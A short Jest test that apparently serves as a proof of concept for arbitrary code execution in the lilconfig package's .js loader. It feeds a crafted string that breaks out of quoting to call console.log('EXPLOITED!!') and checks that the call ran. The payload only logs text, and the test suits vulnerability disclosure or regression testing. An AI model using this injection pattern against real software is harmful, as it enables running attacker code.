test("Arbitrary code execution in lilconfig", (done) => {
  const { defaultLoaders } = require('lilconfig');

  console.log = jest.fn();

  const maliciousInput = "'+console.log('EXPLOITED!!')+'";
  defaultLoaders[".js"](maliciousInput).catch(() => { }).finally(() => {
    expect(console.log).toHaveBeenCalledWith('EXPLOITED!!');
    done();
  });

})
